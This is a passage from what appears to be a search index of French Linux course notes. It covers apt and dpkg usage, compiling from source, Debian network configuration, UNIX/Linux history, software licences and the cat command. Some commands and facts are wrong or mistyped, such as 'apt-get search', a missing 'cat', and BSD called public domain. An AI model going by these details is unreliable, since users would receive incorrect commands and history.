<code>apt</code> </p> Utilisateur Standardroot <p>Utiliateur standard pourra r\u00e9alis\u00e9es: - op\u00e9rations de recherche - consultation</p> <p>Pourra r\u00e9aliser toutes op\u00e9rations pouvant alt\u00e9rer le syst\u00e8me</p>"},{"location":"Linux/Gestion_paquets_logiciel/#commande-courante-de-gestion","title":"Commande courante de gestion","text":""},{"location":"Linux/Gestion_paquets_logiciel/#mettre-a-jour-la-base-de-donnees-des-paquets-disponibles","title":"Mettre a jour la base de donn\u00e9es des paquets disponibles","text":"<pre><code>root@deb:~# apt update\nroot@deb:~# apt-get update\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#mettre-a-jour-la-distribution-sans-supprimer-de-paquets","title":"Mettre \u00e0 jour la distribution sans supprimer de paquets","text":"<pre><code>root@deb:~# apt upgrade\nroot@deb:~# apt-get upgrade\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#mettre-a-jour-la-distribution-avec-eventuelle-suppression-de-paquets-obsoletes","title":"Mettre \u00e0 jour la distribution avec \u00e9ventuelle suppression de paquets obsol\u00e8tes","text":"<pre><code>root@deb:~# apt full-upgrade\nroot@deb:~# apt-get dist-upgrade\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#installer-des-paquets","title":"Installer des paquets","text":"<pre><code>root@deb:~# apt install paquet1 &lt;paquet2&gt;\nroot@deb:~# apt-get install paquet1 &lt;paquet2&gt;\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#desinstaller-des-paquets","title":"D\u00e9sinstaller des paquets","text":"<pre><code>root@deb:~# apt remove paquet1 &lt;paquet2&gt;\nroot@deb:~# apt-get remove paquet1 &lt;paquet2&gt;\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#desinstaller-un-paquet-en-supprimant-les-fichiers-de-configuration","title":"D\u00e9sinstaller un paquet en supprimant les fichiers de configuration","text":"<pre><code>root@deb:~# apt purge paquet1\nroot@deb:~# apt-get purge paquet1\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#nettoyer-le-depot-local-des-fichiers-telecharges-suite-a-mise-a-jour-et-autres","title":"Nettoyer le d\u00e9p\u00f4t local des fichiers t\u00e9l\u00e9charg\u00e9s suite \u00e0 mise \u00e0 jour et autres","text":"<pre><code>root@deb:~# apt clean\nroot@deb:~# apt-get clean\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#chercher-un-paquet-correspondant-a-une-expression-rationnelle","title":"Chercher un paquet correspondant \u00e0 une expression rationnelle","text":"<pre><code>root@deb:~# apt search regex\nroot@deb:~# apt-get search regex\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#obtenir-des-informations-detaillees-sur-un-paquet","title":"Obtenir des informations d\u00e9taill\u00e9es sur un paquet","text":"<pre><code>root@deb:~# apt show paquet\nroot@deb:~# apt-cache show paquet\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#commande-dpkg","title":"Commande <code>dpkg</code>","text":"<p><code>dpkg</code> est la base du syst\u00e8me de gestion des paquets Debian. Il est l\u2019\u00e9quivalent de la commande <code>rpm</code>pour les distributions de la branche RedHat. Il a \u00e9t\u00e9 con\u00e7u pour\u00a0:</p> <ul> <li>Installer / mettre \u00e0 jour des paquets Debian</li> <li>Supprimer des paquets</li> <li>Fournir des informations</li> </ul> <p><code>dpkg</code> Permets d\u2019obtenir des informations pr\u00e9cieuses sur les paquets ou les fichiers install\u00e9s \u00e0 partir de paquets.  </p>"},{"location":"Linux/Gestion_paquets_logiciel/#lister-les-paquets-disponibles-dans-les-depots-et-contenant-la-chaine-ftp","title":"Lister les paquets disponibles dans les d\u00e9p\u00f4ts et contenant la chaine \u00ab\u00a0ftp\u00a0\u00bb","text":"<pre><code>root@deb:~# dpkg \u2013l \"*ftp*\"\nSouhait=inconnU/Install\u00e9/suppRim\u00e9/Purg\u00e9/H=\u00e0 garder\n| \u00c9tat=Non/Install\u00e9/fichier-Config/d\u00e9paqUet\u00e9/\u00e9chec-conFig/H=semi-install\u00e9/W=attend \nErr?=(aucune)/besoin R\u00e9installation (\u00c9tat,Err: majuscule=mauvais)\n||/ Nom                 Version            Architecture Description+++-===================-==================-============-=====================================ii openssh-sftp-server 1:7.9p1-10+deb10u2  amd64        secure shell (SSH) sftp server module\nun pure-ftpd           &lt;aucune&gt;            &lt;aucune&gt;     (aucune description n'est disponible)\nun sftp                &lt;aucune&gt;            &lt;aucune&gt;     (aucune description n'est disponible)\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#lister-les-fichiers-installes-pour-un-paquet-present-sur-le-systeme","title":"Lister les fichiers install\u00e9s pour un paquet pr\u00e9sent sur le syst\u00e8me","text":"<pre><code>root@deb:~# dpkg -L telnet\n[...]\n/usr/bin/telnet.netkit\n/usr/share\n/usr/share/doc\n/usr/share/doc/telnet\n/usr/share/doc/telnet/README\n/usr/share/doc/telnet/changelog.Debian.gz\n[...]\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#chercher-le-paquet-a-lorigine-dun-fichier","title":"Chercher le paquet \u00e0 l\u2019origine d\u2019un fichier","text":"<pre><code>root@deb:~# dpkg -S /usr/bin/scp\nopenssh-client: /usr/bin/scp\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#les-fichiers-journaux","title":"Les fichiers journaux","text":"<p>Ils permettent de consulter l\u2019historique des installations et mise \u00e0 jour. Chaque utilitaire dispose de son propre fichier de logs\u00a0:  </p> <ul> <li><code>apt-get</code>&amp;\u00a0<code>apt</code>: interroge le fichier **/var/log/apt/history.log *\u00a0<code>dpkg</code>: interroge le fichier /var/log/dpkg.log</li> </ul> <p>Les commandes <code>apt-get</code>&amp; <code>apt</code>s\u2019appuient sur <code>dpkg</code>pour l\u2019installation proprement dite. On doit donc retrouver dans les logs de dpkg toutes les interventions r\u00e9alis\u00e9es sur les paquets.  </p>"},{"location":"Linux/Gestion_paquets_logiciel/#installation-a-partir-des-sources","title":"Installation \u00e0 partir des sources","text":"<p>Il est important de faire un espace de compilation sp\u00e9cifique \u00e0 un utilisateur qui n'est pas root afin d'\u00e9viter des probl\u00e9matiques syst\u00e8mes et sa s\u00e9curisation</p> <p>Il s\u2019agit de la m\u00e9thode native d\u2019installation sur les syst\u00e8mes Unix/Linux  </p> <p>Cette technique n\u2019est pas la plus simple, et varie \u00e9norm\u00e9ment suivant le type de source r\u00e9cup\u00e9r\u00e9. Il y a tout de m\u00eame un cheminement \u00e0 suivre.  </p>"},{"location":"Linux/Gestion_paquets_logiciel/#lecture-de-la-documentation","title":"Lecture de la documentation","text":"<p>La documentation est g\u00e9n\u00e9ralement disponible sous un fichier README ou INSTALL. Celui-ci contient g\u00e9n\u00e9ralement les autres \u00e9tapes de la construction de l\u2019application, avec la liste des d\u00e9pendances de construction de fonctionnement.</p>"},{"location":"Linux/Gestion_paquets_logiciel/#preparation-de-la-compilation","title":"Pr\u00e9paration de la compilation","text":"<p>Cette \u00e9tape va v\u00e9rifier s\u2019il y a toutes les d\u00e9pendances de compilation sur le syst\u00e8me puis g\u00e9n\u00e9rer un fichier Makefile contenant toutes les informations de compilation et d\u2019installation.</p> <pre><code>user@deb:/opt/sources/application$ ./configure\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#compilation","title":"Compilation","text":"<p>A l'issue de cette \u00e9tape, l'application n'est toujours pas install\u00e9e dans le syst\u00e8me, mais elle est totalement fonctionnelle.</p> <p>Cette \u00e9tape va permettre de cr\u00e9er l\u2019application compil\u00e9e \u00e0 partir de ses sources en se basant sur le fichier Makefile contenant toutes les informations de compilation.  </p> <pre><code>user@deb:/opt/sources/application$ make\n</code></pre>"},{"location":"Linux/Gestion_paquets_logiciel/#installation","title":"Installation","text":"<p>C\u2019est la seule \u00e9tape \u00e0 r\u00e9aliser avec les privil\u00e8ges root car cette \u00e9tape est une simple copie de l\u2019application dans les r\u00e9pertoires syst\u00e8me comme opt/bin par exemple.</p> <pre><code>root@deb:/opt/sources/application# make install\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/","title":"Gestion du r\u00e9seau","text":"<p>Objectifs  </p> <p>Prendre des informations sur le r\u00e9seau Configuration r\u00e9seau d\u2019un syst\u00e8me sans interface graphique Configuration r\u00e9seau d\u2019un syst\u00e8me avec interface graphique  </p>"},{"location":"Linux/Gestion_reseau_debian/#prise-dinformation-reseau","title":"Prise d\u2019information r\u00e9seau","text":"<p>Pour une mise en r\u00e9seau des postes client et serveur, la couche IP doit \u00eatre correctement r\u00e9alis\u00e9e La configuration IP a g\u00e9n\u00e9ralement besoin\u00a0:  </p> <ul> <li>d\u2019une adresse IP</li> <li>d\u2019un masque r\u00e9seau</li> <li>potentiellement d\u2019une passerelle par d\u00e9faut</li> </ul> <p>Afin de r\u00e9soudre les noms d\u2019h\u00f4tes, il faudra \u00e9galement renseigner un ou des serveurs DNS.  </p> <p>Pour prendre les renseignements r\u00e9seau n\u00e9cessaires sur notre machine la commande <code>ip</code>sera \u00e0 la base des prochaines recherches  </p>"},{"location":"Linux/Gestion_reseau_debian/#connaitre-ladresse-reseau","title":"Connaitre l\u2019adresse r\u00e9seau","text":"<p>La commande <code>ip</code>suivie de l\u2019option <code>&lt;address&gt;</code>ou le raccourci <code>&lt;a&gt;</code> </p> <code>ip address</code> ou <code>ip a</code> <pre><code>root@deb:~# ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n        valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n        valid_lft forever preferred_lft forever\n2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000\n    link/ether 00:0c:29:7c:ff:ba brd ff:ff:ff:ff:ff:ff\n    inet 192.168.1.50/24 brd 192.168.1.255 scope global dynamic ens33\n        valid_lft 85457sec preferred_lft 85457sec inet6 fe80::20c:29ff:fe7c:ffba/64 scope link\n        valid_lft forever preferred_lft forever\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/#connaitre-la-passerelle","title":"Connaitre la passerelle","text":"<p>La commande <code>ip</code>avec l\u2019option <code>&lt;route&gt;</code>ou son raccourci <code>&lt;r&gt;</code> </p> <code>ip route</code> ou <code>ip r</code> <pre><code>root@deb:~# ip r\ndefault via 192.168.1.1 dev ens33\n192.168.1.0/24 dev ens33 proto kernel scope link src 192.168.1.50\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/#connaitre-le-serveur-dns","title":"Connaitre le serveur DNS","text":"<p>Les informations de DNS se trouvent dans le fichier <code>/etc/resolv.conf</code> </p> Chemin DNS <pre><code>root@deb:~# cat /etc/resolv.conf\nsearch mondomaine.fr\nnameserver 10.1.2.20\nnameserver 10.1.2.21\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/#systeme-sans-gui","title":"Syst\u00e8me sans GUI","text":"<p>Dans un syst\u00e8me sans GUI la configuration IP &amp; DNS se font dans deux fichiers de configuration  </p> <p>Pour g\u00e9rer la partie IP il faut se rendre dans le fichier /etc/network/interfaces Il sera possible d\u2019avoir une configuration simplifi\u00e9e via un serveur DHCP ou une configuration statique </p>"},{"location":"Linux/Gestion_reseau_debian/#configuration-ip-en-dhcp-et-en-statique","title":"Configuration IP en DHCP et en statique","text":"configuration DHCPconfiguration Statique <pre><code>root@deb:~# vim /etc/network/interfaces\n# The loopback network interface\nauto lo\niface lo inet loopback\n# Carte r\u00e9seau - Ethernet ens33\nauto ens33\nallow-hotplug ens33\niface ens33 inet dhcp\n</code></pre> <pre><code>root@deb:~# vim /etc/network/interfaces\n# The loopback network interface\nauto lo\niface lo inet loopback\n# Carte r\u00e9seau - Ethernet ens33\nauto ens33\niface ens33 inet static\n        address 10.1.1.10\n        netmask 255.255.0.0\n        gateway 10.1.255.254\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/#configuration-dns-statique","title":"Configuration DNS Statique","text":"<p>Il faudra mettre en place une configuration statique dans le fichier /etc/resolv.conf via la directive nameserver</p> <pre><code>root@deb:~# vim /etc/resolv.conf\nsearch mondomaine.fr\nnameserver 10.1.2.20\nnameserver 10.1.2.21\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/#validation-des-modifications","title":"Validation des modifications","text":"<p>Pour effectuer la prise en compte des modifications, on utilise la commande <code>systemctl</code> pour g\u00e9rer le service networking </p>"},{"location":"Linux/Gestion_reseau_debian/#arreterdemarrerredemarrer-le-service-reseau","title":"Arr\u00eater/d\u00e9marrer/red\u00e9marrer le service r\u00e9seau","text":"Arr\u00eaterD\u00e9marrerRed\u00e9marrer <pre><code>root@deb:~# systemctl stop networking.service\n</code></pre> <pre><code>root@deb:~# systemctl start networking.service\n</code></pre> <pre><code>root@deb:~# systemctl restart networking.service\n</code></pre>"},{"location":"Linux/Gestion_reseau_debian/#systeme-avec-gui","title":"Syst\u00e8me avec GUI","text":"<p>Une GUI offre la possibilit\u00e9 d\u2019utiliser Network Manager pour effectuer les param\u00e9trages r\u00e9seau.  </p> <p>ou via la commande <code>nmtui</code>\u00e0 rentrer dans le terminal  </p> <p>Pour la prise en compte des modifications, il faudra\u00a0:  </p> <p>Soit red\u00e9marrer NetworkManager via le terminal avec la commande <code>systemctl</code> </p> <pre><code>root@deb:~# systemctl restart NetworkManager\n</code></pre> <p>ou bien via l\u2019interface graphique  </p>"},{"location":"Linux/Introduction_UNIX_Linux/","title":"Linux","text":""},{"location":"Linux/Introduction_UNIX_Linux/#historique-unix","title":"Historique UNIX","text":"<p>Objectif\u00a0:</p> <p>Connaitre les racines historiques de GNU/Linux Avoir une id\u00e9e de l\u2019importance de Linux dans le monde actuel Savoir donner des exemples d\u2019utilisation de Linux dans la vie courante  </p> <p>1969/70\u00a0: cr\u00e9ation de unics par ken thompson, dennis Ritchie et brian Kernighan premi\u00e8re version \u00e9crite en langage B (ken thompson et dennis ritchie) 1971\u00a0: premi\u00e8re version officielle d\u2019UNIX (changement de nom d\u00e9finitif) 1972\u00a0: Dennis Ritchie cr\u00e9\u00e9 le langage C (am\u00e9lioration du langage B plus portable) 1973\u00a0: r\u00e9\u00e9criture du noyau Unix en langage C, l\u2019universit\u00e9 de Berkeley est la premi\u00e8re a disposer d\u2019Unix. 1976\u00a0: Unix Time-Sharing System\u00a0V6. disponible avec les sources afin de pouvoir lire, modifier, comprendre le principe du fonctionnement du syst\u00e8me 1977\u00a0: Bill Joy travaille a la cr\u00e9ation de 1\u00a0BSD sur les bases d\u2019Unix\u00a0V6. 1979\u00a0: sortie de 2\u00a0BSD incluant notamment le C Shell et l\u2019\u00e9diteur Vi cr\u00e9es par Bill Joy (Bill joy sera un fondateur de la soci\u00e9t\u00e9 Sun Microsystems c\u00e9l\u00e8bre pour les logiciels java et la suite bureautique open office) 1983\u00a0: Richard MAthew Stallman cr\u00e9\u00e9 le projet GNU, a la suite des fermetures des sources par de nombreux industriels (plus d\u2019acc\u00e8s aux codes), le but du projet est de cr\u00e9e un OS dont tous les composants sera un logiciel libre, afin d\u2019acc\u00e9der au code sources modifiable a l\u2019envies afin d\u2019adapter ou modifier celui-ci le projet GNU ce developpe sans noyau jusque dans les ann\u00e9es\u00a090. 1987\u00a0: cr\u00e9ation d\u2019un clone Unix nomm\u00e9 minix compatible IBM PC par Andrew Tanenbaum, syst\u00e8me destin\u00e9 principalement aux gens qui souhaitent \u00e9tudier le fonctionnement d\u2019un syst\u00e8me d\u2019exploitation  </p>"},{"location":"Linux/Introduction_UNIX_Linux/#historique-linux","title":"Historique LINUX","text":"<p>1991\u00a0: 25/08/1991 Linus Torvalds annonce son projet de cr\u00e9ation d\u2019un syst\u00e8me d\u2019exploitation libre, aux utilisateurs de minix pour arch\u00a0i386 compatible ibm pc. Il s\u2019agit de base d\u2019un hobbie et il ne souhaitait rien de massif et de professionnel comme le projet GNU. Projet GNU auquel il manquait un noyau, trouvera celui-ci dans le projet Linux 1992\u00a0: sortie de premi\u00e8re distribution GNU/Linux nomm\u00e9e SLS (distribution = diff\u00e9rente version des syst\u00e8mes complets GNU/Linux qui m\u00e9lange le noyau Linux et tous les logiciels li\u00e9s au projet GNU) 1993\u00a0: SLS laisse place \u00e0 Slackware et la cr\u00e9ation de la distribution Debian 1994\u00a0: arrive les distributions Red Hat et SuSE, c\u2019est 4\u00a0distributions sont toujours pr\u00e9sentes \u00e0 l\u2019heure actuelle 1996\u00a0: cr\u00e9ation de la mascotte Tux, cr\u00e9ation de l\u2019environnement graphique KDE 1997\u00a0: cr\u00e9ation de l\u2019environnement graphique Gnome 2004\u00a0: cr\u00e9ation de la distribution Ubuntu par Mark Shuttleworth, distribution Linux \u00e0 destination du grand public, car plus facile d\u2019acc\u00e8s  </p>"},{"location":"Linux/Introduction_UNIX_Linux/#quest-ce-que-linux","title":"Qu\u2019est-ce que Linux\u00a0?","text":"<ul> <li>Linux est un OS majeur, issue d\u2019Unix, tr\u00e8s fr\u00e9quent dans les infrastructures r\u00e9seau</li> <li>Linux s\u2019utilise principalement en CLI, \u00e0 la diff\u00e9rence des OS plus graphiques (windows, MACoS)</li> <li>Linux peut aussi utiliser des GUI, plus int\u00e9ressant pour des utilisateurs non initi\u00e9s et/ou relancer des machines un peu vieilles (Linux demandant moins de ressources que Windows)  </li> <li>interface graphique les plus connue\u00a0:</li> <li>Gnome</li> <li>KDE</li> <li>XFCE</li> <li>LXDE</li> </ul> <p>Les distributions GNU/Linux sont aujourd\u2019hui tr\u00e8s nombreuses. Avec parfois de simple variante Kubuntu, Lubuntu, Xubuntu variante de la distribution m\u00e8re Ubuntu (Kubuntu = Ubuntu + GUI KDE, Lubuntu = Ubuntu + LXDE) Dans le monde professionnel, on rencontre principalement les distributions suivantes\u00a0:</p> <ul> <li>Red Hat Entreprise Linux (RHEL)\u00a0: Distribution soumise a licence de par son \u00e9diteur, abonnement donne acc\u00e8s au support privil\u00e9gi\u00e9 de Red Hat.   Possibilit\u00e9 d\u2019acc\u00e9der \u00e0 une licence gratuite pour tester la distribution avec le programme d\u00e9veloppeur, mais interdite en production.  </li> <li>CentOS\u00a0: distribution issue de Red Hat, jusqu\u2019en 2021 il s\u2019agissait d\u2019une version downstream, il s\u2019agissait d\u2019un Red Hat sans support officiel ce qui permettait de la d\u00e9ployer en entreprise sans s\u2019acquitter d\u2019une licence, il s\u2019agit d\u2019une distribution \u00e0 part enti\u00e8re avec sa propre \u00e9quipe de d\u00e9veloppement. En 2021 la distribution a \u00e9volu\u00e9 vers CentOS stream (version plus upstream) moins adapt\u00e9 pour les entreprises. (LTS)</li> <li>Debian\u00a0: distribution GNU/Linux enti\u00e8rement libre et gratuite, r\u00e9put\u00e9e pour sa stabilit\u00e9 (LTS)</li> <li>SuSE Linux\u00a0: \u00e9galement en version libre au travers openSUSE et la version SUSE Linux entreprise, rencontr\u00e9e \u00e0 travers des appliances (un paquet avec un mini OS Linux sur lequel est appos\u00e9 un produit logiciel particulier, un produit int\u00e9gr\u00e9 directement dans l\u2019OS et donne donc un ensemble pr\u00eat a l\u2019emploi, \u00e0 travers un DVD, une iso, une machine virtuelle)</li> <li>Ubuntu Server\u00a0: a l\u2019origine ubuntu \u00e9tait orient\u00e9e machine de bureau (desktop) une version serveur est arriv\u00e9e en 2006. Ubuntu propose un LTS (long Time Support) afin de b\u00e9n\u00e9fici\u00e9 d\u2019un support et des maj sur 5\u00a0ans, la ou une version interm\u00e9diaire ne propose 1\u00a0support que sur 1\u00a0an.  </li> </ul> <p>Linux est majoritairement pr\u00e9sent dans le monde. Depuis le web avec UNIX, jusqu\u2019aux nouveaux outils de miniaturisation (raspberry, Arduino). Linux est pr\u00e9sent au quotidien dans nos utilisations cela gr\u00e2ce \u00e0 une certaine stabilit\u00e9 li\u00e9e a un impact relativement modique du syst\u00e8me sur les performances en plus de sa relative gratuit\u00e9 (libre ne veut pas dire gratuit voir Red Hat).</p> <p>Grosse utilisation de Linux</p> <ul> <li>Serveur web </li> <li>service Apache, Nginx</li> <li>Serveurs de base de donn\u00e9es</li> <li>MySql, OracleDB, MariaDB</li> <li>Serveurs d\u2019applications Java</li> <li>Smartphone</li> <li>Android est un d\u00e9riv\u00e9 de Linux</li> <li>Internet des Objets (IoT= Internet Of Things)</li> <li>SmartWatch, Smart-TV, V\u00e9hicules Intelligents, \u2026</li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#distribution-specialisee-liste-non-exhaustive","title":"Distribution sp\u00e9cialis\u00e9e (liste non exhaustive)","text":"<ul> <li>Kali Linux (orient\u00e9e s\u00e9curit\u00e9) certain des outils natifs \u00e0 Kali Linux peuvent \u00eatre consid\u00e9r\u00e9 comme des outils de piratage en entreprise, avant de le d\u00e9ployer bien se renseigner au niveau de la s\u00e9curit\u00e9 de l\u2019entreprise.</li> <li>Debien pour Raspberry (Raspbian) (Debian sur RaspberryPi)</li> <li>3CX (Distribution bas\u00e9e sur Debian impl\u00e9mentant la solution de t\u00e9l\u00e9phonie \u00e9ponyme)</li> <li>System Rescue\u00a0CD (R\u00e9cup\u00e9ration de syst\u00e8me et de donn\u00e9es en LiveCD/USB) peut faire partir de la boite \u00e0 outils du technicien en entreprise.</li> <li>PrimTux (Distribution orient\u00e9e \u00e9ducation)</li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#distribution-client-liste-non-exhaustive","title":"Distribution Client (Liste non exhaustive)","text":"<p>Distribution orient\u00e9e poste de travail, Linux \u00e9tant moins gourmand au niveau ressource il peut servir a remettre en service des machines plus anciennes et sera largement suffisant pour effectuer de la bureautique, de la navigation web ou du multim\u00e9dia (\u00e9coute de musique, lecture de vid\u00e9o)</p> <ul> <li>Linux Mint\u00a0: D\u00e9riv\u00e9 d\u2019Ubuntu, tr\u00e8s populaire et bien adapt\u00e9 aux d\u00e9butants.</li> <li>ZorinOS\u00a0: A pour but de permettre une transition facile depuis Windows ou MacOS avec un travail soign\u00e9 sur la GUI. Existe aussi en version light et \u00e9ducative.</li> <li>Kubuntu/Xubuntu/Lubuntu\u00a0: Ubuntu et ses diverses d\u00e9clinaisons avec divers environnements graphiques peuvent offrir plusieurs exp\u00e9riences aux utilisateurs.</li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#licences-et-logiciels-libres","title":"Licences et logiciels libres","text":"<p>La notion de logiciels libres est tr\u00e8s importante dans le monde Linux. Cela permet \u00e0 chacun de librement modifier, adapter les logiciels \u00e0 ses besoins.  </p> <p>Free Software Foundations Sa mission premi\u00e8re est de financer les logiciels libres Elle met en avant la libert\u00e9 et non la gratuit\u00e9 des logiciels libres.</p> <ul> <li>Association fond\u00e9e par Richard Stallman en 1985</li> <li>Promotion des logiciels libres</li> <li>D\u00e9fense des utilisateurs</li> </ul> <p>Diff\u00e9rentes licences dites libres coexistent. Elles pr\u00e9cisent des droits et devoirs qui peuvent diverger sur la forme comme sur le fond.  </p>"},{"location":"Linux/Introduction_UNIX_Linux/#la-licence-gnu-general-public-license-est-la-plus-connue-et-la-plus-frequente-celle-ci-est-actuellement-en-version-3","title":"La licence GNU General Public License est la plus connue et la plus fr\u00e9quente, celle-ci est actuellement en version\u00a03.","text":"<p>Licence utilis\u00e9e par les d\u00e9veloppeurs du noyau Linux et des diverses briques du projet GNU.  </p> <ul> <li>Quatre droits et devoirs\u00a0:</li> <li>Libert\u00e9 d\u2019ex\u00e9cuter le logiciel, pour n\u2019importe quel usage.</li> <li>Libert\u00e9 d\u2019\u00e9tudier un programme et de l\u2019adapter, via l\u2019acc\u00e8s aux codes sources.</li> <li>Libert\u00e9 de redistribuer des copies.</li> <li>Faire b\u00e9n\u00e9ficier la communaut\u00e9 des versions modifi\u00e9es.</li> </ul> <p>La licence GNU GPL n\u2019est pas seule il y a notamment les licences </p>"},{"location":"Linux/Introduction_UNIX_Linux/#apache","title":"Apache","text":"<ul> <li>G\u00e9r\u00e9 par Apache Software Foundation</li> <li>Autorise la modification et distribution du code source</li> <li>Respect du Copyright </li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#bsd","title":"BSD","text":"<ul> <li>Autorise la r\u00e9utilisation sans restriction</li> <li>Licence dans le domaine public et librement modifiable</li> <li>Pas de copyleft</li> <li>Plusieurs versions (BSD, Bsd3)</li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#cecill-license-francaise","title":"CeCILL (License Fran\u00e7aise)","text":"<ul> <li>Abr\u00e9viation de CEA CNRS INRIA Logiciels Libres</li> <li>Conforme au droit Fran\u00e7ais</li> <li>Respect des principes du logiciel libre</li> <li>Int\u00e9ressant pour des dev proposant les cr\u00e9ations en interner, au sein du pays</li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#creative-commons","title":"Creative Commons","text":"<ul> <li>S\u2019applique aux cr\u00e9ations artistiques</li> <li>Utilis\u00e9 pour les photos, logos, graphiques ou autres musiques pr\u00e9sentes dans les logiciels libres</li> <li>De nombreuses sous-cat\u00e9gories</li> </ul>"},{"location":"Linux/Introduction_UNIX_Linux/#debian","title":"Debian","text":"<p>1993 - Cr\u00e9ation de Debian depuis cette date une quinzaine de versions on vu le jour.  </p> <p>La distribution Debian a \u00e9t\u00e9 con\u00e7ue d\u00e8s son origine pour les syst\u00e8mes serveur. Ce qui implique un calendrier de sorties assez long et que cette distribution n\u2019est pas une ergonomie d\u2019utilisation propice au utilisateurs finaux. Ce dernier point ayant pu \u00eatre combl\u00e9 via les distributions Ubuntu et Linux Mint.  </p> <p>Debian a toujours, depuis sa cr\u00e9ation, eu 2\u00a0objectifs Qualit\u00e9 et Aspect non commercial </p> <p>Le projet Debian a d\u00e9fini les principes du logiciel libre, que la communaut\u00e9 s\u2019engage \u00e0 respecter\u00a0:  </p> <ul> <li>Redistribution libre</li> <li>Disponibilit\u00e9 du code source</li> <li>Licences</li> </ul> <p>Par ce biais le projet Debian a \u00e9galement \u00e9tabli un contrat social avec la communaut\u00e9\u00a0:  </p> <ol> <li>Debian demeurera totalement libre.</li> <li>Nous donnerons nos travaux \u00e0 la communaut\u00e9 des logiciels libres.</li> <li>Nous ne dissimulerons pas les probl\u00e8mes.</li> <li>Nos priorit\u00e9s sont nos utilisateurs et les logiciels libres.</li> <li>Les travaux non conformes aux principes du logiciel libre pourront \u00eatre disponibles dans des sections diff\u00e9renci\u00e9es ne faisant pas partie du syst\u00e8me Debian.</li> </ol> <p>[https://www.debian.org/social_contract.fr.html]</p>"},{"location":"Linux/Introduction_UNIX_Linux/#differentes-branches-et-version","title":"diff\u00e9rentes Branches et Version","text":"<p>La version actuelle de Debian est la 11 -Bulleyes (la 12 \u00e9tant en cours de d\u00e9ploiement).</p> <p>Toutes les versions de Debian comportent 3\u00a0principales branches (Release)  </p> <pre><code>graph LR\n A[Version de Debian] --&gt; B[Stable];\n B --&gt; C[Old-Stable];\n C --&gt; D[Old-Old-Stable];\n A --&gt; E[Testing];\n A --&gt; F[Unstable];\n</code></pre> <p>Stable\u00a0: Version de production de Debian, celle recommand\u00e9e d\u2019utiliser Testing: contiens la future version stable de Debian Unstable: Version en constante \u00e9volution (on parle de Rolling Release). Cette version est toujours appel\u00e9e Sid.  </p> <p>En plus des 3\u00a0branches principales, des sous-branches existent Old-Stable &amp; Old-Old-Stable, elles d\u00e9signent les branches\u00a0N-1 et N-2.  </p> <p>Version Stable actuel = 11, Old-Stable = 10 Old-Old-Stable = 9</p>"},{"location":"Linux/Liens_sous_unix_linux/","title":"Les liens sous Unix/Linux","text":""},{"location":"Linux/Liens_sous_unix_linux/#liens-symboliques","title":"Liens symboliques","text":"<p>permet d\u2019avoir </p>"},{"location":"Linux/Liens_sous_unix_linux/#liens-physiques","title":"Liens physiques","text":"<p>Principe de fonctionnement duplique les donn\u00e9es quelque part</p>"},{"location":"Linux/Lire_editer_texte/","title":"Texte sous Linux","text":""},{"location":"Linux/Lire_editer_texte/#lire-du-texte","title":"Lire du texte","text":""},{"location":"Linux/Lire_editer_texte/#commande-cat","title":"Commande <code>cat</code>","text":"<p>Permets d\u2019afficher l\u2019int\u00e9gralit\u00e9 d\u2019un fichier \u00e0 l\u2019\u00e9cran Elle a l\u2019avantage d\u2019\u00eatre facile d\u2019utilisation, mais inadapt\u00e9 aux fichiers longs  </p> <p><code>cat &lt;fichier&gt;</code> </p> <p>Possibilit\u00e9 \u00e9galement d\u2019afficher 2\u00a0fichiers \u00e0 la suite. Les fichiers seront concat\u00e9n\u00e9s comme dans l\u2019exemple suivant</p> <p><code>cat &lt;fichier&gt; &lt;fichier2&gt;</code></p> Commande <code>cat</code> cat + 1 fichiercat + 2 fichiers <pre><code>user30@deb:~$ cat contacts.txt\nAnne-Sophie    548\nRomain         351\nEstelle        350\nuser30@deb:~$ cat entete.txt\nPrenom         Tel\n------         ---\n</code></pre> <pre><code>user30@deb:~$ entete.txt contacts.txt\nPrenom         Tel\n------         ---\nAnne-Sophie    548\nRomain         351\nEstelle        350\n</code></pre> <p>La commande <code>cat</code>permet \u00e9galement d\u2019\u00e9crire du texte dans un nouveau fichier.  </p> <p><code>cat&gt; &lt;fichier&gt;</code></p> \u00e9criture avec <code>cat</code> <pre><code>user30@deb:~$ cat &gt; newcontacts.txt # indique l'\u00e9criture dans le fichier 'newcontacts.txt'\nSarah      255 # passage a la ligne suivante via la touche \"entr\u00e9e\"\nMehdi      548\nFred       999\n[ctrl+D] # permet d'indiquer la fin de la saisie et proc\u00e8de a l'enregistrement du fichier\n</code></pre>"},{"location":"Linux/Lire_editer_texte/#commande-more","title":"Commande <code>more</code>","text":"<p><code>more [-d -s] &lt;fichier&gt;</code></p> <p>Permet de lire un fichier int\u00e9gralement page par page, contrairement 